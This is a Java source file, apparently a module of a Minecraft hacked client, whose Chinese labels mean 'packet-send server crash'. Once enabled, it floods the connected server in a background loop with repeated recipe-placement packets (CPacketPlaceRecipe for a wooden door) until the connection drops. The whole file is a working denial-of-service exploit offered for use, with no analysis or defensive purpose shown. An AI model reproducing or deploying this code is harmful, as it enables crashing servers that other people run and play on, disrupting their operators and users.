package moe.badcat.module.modules;

import moe.badcat.module.BaseEnableModule;
import net.minecraft.client.Minecraft;
import net.minecraft.item.crafting.CraftingManager;
import net.minecraft.network.NetworkManager;
import net.minecraft.network.play.client.CPacketPlaceRecipe;
import net.minecraft.util.ResourceLocation;

public class ModuleRecipeCrash extends BaseEnableModule {
    public ModuleRecipeCrash() {
        super("发包崩服", "原版合成");
    }

    @Override
    public void onUse() {
        super.onUse();

        if (isEnable()) {
            startSendPacketThread();
        }
    }

    public void startSendPacketThread() {
        NetworkManager networkManager = Minecraft.getMinecraft().getConnection().getNetworkManager();
        CPacketPlaceRecipe packet = new CPacketPlaceRecipe(0, CraftingManager.getRecipe(new ResourceLocation("wooden_door")), true);
        new Thread(() -> {
            while (enable && networkManager.isChannelOpen()) {
                networkManager.sendPacket(packet);
                try { Thread.sleep(ModulePacketDelay.delay); } catch (InterruptedException ignored) { }
            }
            enable = false;
        }).start();
    }
}
